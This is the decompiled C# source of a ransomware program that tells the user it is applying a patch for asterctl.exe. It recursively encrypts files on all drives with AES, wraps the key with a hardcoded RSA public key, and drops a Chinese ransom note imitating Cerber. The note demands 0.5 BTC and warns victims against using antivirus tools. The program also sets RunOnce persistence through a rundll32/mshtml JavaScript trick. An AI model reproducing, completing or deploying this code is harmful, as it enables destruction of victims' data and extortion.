using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace Ransomware;

internal static class Program
{
	public enum ShowCommands
	{
		SW_HIDE = 0,
		SW_SHOWNORMAL = 1,
		SW_NORMAL = 1,
		SW_SHOWMINIMIZED = 2,
		SW_SHOWMAXIMIZED = 3,
		SW_MAXIMIZE = 3,
		SW_SHOWNOACTIVATE = 4,
		SW_SHOW = 5,
		SW_MINIMIZE = 6,
		SW_SHOWMINNOACTIVE = 7,
		SW_SHOWNA = 8,
		SW_RESTORE = 9,
		SW_SHOWDEFAULT = 10,
		SW_FORCEMINIMIZE = 11,
		SW_MAX = 11
	}

	[DllImport("shell32.dll")]
	private static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, ShowCommands nShowCmd);

	private static void encryptAll(string dir, byte[] aesKey, string size)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(dir);
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.*");
			foreach (FileInfo fileInfo in files)
			{
				ransomwareCryptoMod.encryptFile(fileInfo.FullName, aesKey, size);
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				encryptAll(directoryInfo2.FullName, aesKey, size);
			}
		}
		catch (Exception)
		{
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cc: Unknown result type (might be due to invalid IL or missing references)
		_ = DateTime.Now;
		bool createdNew;
		Mutex mutex = new Mutex(initiallyOwned: false, "cuteRansomware", out createdNew);
		mutex.WaitOne();
		GC.Collect();
		if (!createdNew)
		{
			return;
		}
		mutex.ReleaseMutex();
		Thread.CurrentThread.Priority = ThreadPriority.Highest;
		if (File.Exists("asterctl.exe"))
		{
			MessageBox.Show("已找到目录,并添加补丁....");
		}
		else
		{
			MessageBox.Show("未找到asterctl.exe文件,请将本程序放置aster目录下运行！");
		}
		XmlFile xmlFile = new XmlFile();
		if (!File.Exists(encryptInfo.infoPath))
		{
			xmlFile.CreateXmlFile();
			Console.Write("c盘下没有发现adr文件 重新生成");
			Console.WriteLine();
		}
		string s;
		if (!File.Exists("c:\\Program Files\\desktop.int"))
		{
			s = xmlFile.GenHexKey();
			Console.Write("没有找到key文件  重新生成");
			Console.WriteLine();
		}
		else
		{
			s = xmlFile.FindHexKey();
			Console.Write("有找到key 载入数据");
			Console.WriteLine();
		}
		XmlDocument xmlDocument = new XmlDocument();
		xmlDocument.Load(encryptInfo.infoPath);
		byte[] array = Convert.FromBase64String(s);
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString("<RSAKeyValue><Modulus>yZF/6OR0RJhG1IbXaXs37Uj9ctyHEbh59Ge8j9vKNt6oFFE6S8NKJ1+I7Atlyr76CyveuuzNAhfEsFCBLk5DNWPKiocRwRZzXAddOeyIO1dkB0TJW35xmd5ZmhBRBVAbtA/906NZha0yidRILfY0FHtHSwtmmOGdcrtndXDGIA8=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		ransomwareCryptoMod.writeXml(xmlDocument, "HexKey", Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(array, fOAEP: false)));
		DriveInfo[] drives = DriveInfo.GetDrives();
		int num = drives.Length;
		for (int i = num - 1; i >= 2; i--)
		{
			if (drives[i].Name != Environment.SystemDirectory.Substring(0, 3))
			{
				encryptAll(drives[i].Name, array, "normal");
				File.Copy("c://data2.adr", drives[i].Name + "data2.adr", overwrite: true);
				Console.Write("当前目录为 " + drives[i].Name + "加密当前目录normal");
				Console.WriteLine();
			}
			else
			{
				Console.Write("当前目录为 " + drives[i].Name + "跳过当前");
				Console.WriteLine();
			}
		}
		num = drives.Length;
		for (int j = num - 1; j >= 2; j--)
		{
			if (drives[j].Name != Environment.SystemDirectory.Substring(0, 3))
			{
				encryptAll(drives[j].Name, array, "small");
				File.Copy("c://data2.adr", drives[j].Name + "data2.adr", overwrite: true);
				Console.Write("当前目录为 " + drives[j].Name + "加密当前目录small");
				Console.WriteLine();
			}
			else
			{
				Console.Write("当前目录为 " + drives[j].Name + "跳过当前");
				Console.WriteLine();
			}
		}
		num = drives.Length;
		for (int k = num - 1; k >= 2; k--)
		{
			if (drives[k].Name != Environment.SystemDirectory.Substring(0, 3))
			{
				encryptAll(drives[k].Name, array, "big");
				File.Copy("c://data2.adr", drives[k].Name + "data2.adr", overwrite: true);
				Console.Write("当前目录为 " + drives[k].Name + "加密当前目录big");
				Console.WriteLine();
			}
			else
			{
				Console.Write("当前目录为 " + drives[k].Name + "跳过当前");
				Console.WriteLine();
			}
		}
		encryptAll(Environment.SystemDirectory.Substring(0, 3), array, "normal");
		encryptAll(Environment.SystemDirectory.Substring(0, 3), array, "small");
		encryptAll(Environment.SystemDirectory.Substring(0, 3), array, "big");
		int num2 = int.Parse(ransomwareCryptoMod.readXml(xmlDocument, "AllFileNumber"));
		long num3 = long.Parse(ransomwareCryptoMod.readXml(xmlDocument, "AllFileSize")) / 1048576L;
		string text = "    已加密文件：" + num2 + "个     \n\r\n\r     总加密数据：" + num3 + "MB     \n\r\n\r！！！！警告：重要資訊！！！！\n\r\n\r    !!!!WARNING!!!! \n\r\n\r    您的所有文檔數據已被RSA - 2048 和AES - 128暗碼進行了加密。這意味著您的文檔並沒有損壞！您的文檔只是被修改了，這個修改是可逆的，解密之前您無法使用您的文件。欲獲取更多關於加密算法的資訊，請百度搜尋 RSA加密。 \n\r\n\r    由於採用高級不可逆加密算法，沒有秘鑰和解密程式的情況下即使FBI也束手無策。全世界範圍只有我們幾的機密伺服器上的私人秘鑰和解密程式才能解密您的文檔。\n\r\n\r    只有嚴格的按照提示的步驟進行，才能解密您的文檔。\n\r\n\r    請不要使用任何殺毒軟體或者其他工具嘗試恢復文件，或者試圖重裝系統，因為這將會破壞或刪除被加密的文件，導致文件永遠無法恢復！！！\n\r\n\r    若要解密您的文檔，您需要購買特殊的軟體《Cerber Decryptor》\n\r\n\r    所有的交易僅通過比特蔽(BITCOIN)網酪完成。\n\r\n\r    在7天內您可以按照特惠價格0.5BTC（≈$355）購買該軟體。\n\r\n\r    7天過後未進行解密您的檔將永久性無法復原。\n\r\n\r\n\r執行步驟：\n\r\n\r1，若要解密這些文件，請從您的計算機上查找data2.adr文件，此文件可能位於桌面或每壹個分區的根目錄。\n\r\n\r2，此文件包含您唯壹生成的機器碼，用於獲取對應的解密程式，請保存好此文件並將文件通過網路郵件發送至：oecbtc@sigaint.org 。\n\r\n\r3，等待郵件回復，以獲取之後的操作步驟，並根據提示嚴格操作。 ";
		num = drives.Length;
		for (int l = num - 1; l >= 0; l--)
		{
			if (drives[l].Name != Environment.SystemDirectory.Substring(0, 3))
			{
				File.Copy("c://data2.adr", drives[l].Name + "data2.adr", overwrite: true);
				File.WriteAllText(drives[l].Name + "重要資訊.txt", text);
			}
			else
			{
				File.WriteAllText(drives[l].Name + "重要資訊.txt", text);
			}
		}
		File.Copy("c://data2.adr", Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "/data2.adr", overwrite: true);
		for (int m = 0; m < 5; m++)
		{
			MessageBox.Show(text);
		}
		string lpParameters = "javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();shell=new%20ActiveXObject(\"wscript.shell\");shell.regwrite(\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\\\\adr\",\"" + Application.get_ExecutablePath().Replace("\\", "\\\\") + "\");";
		ShellExecute(IntPtr.Zero, "open", "rundll32.exe", lpParameters, "", ShowCommands.SW_HIDE);
	}
}
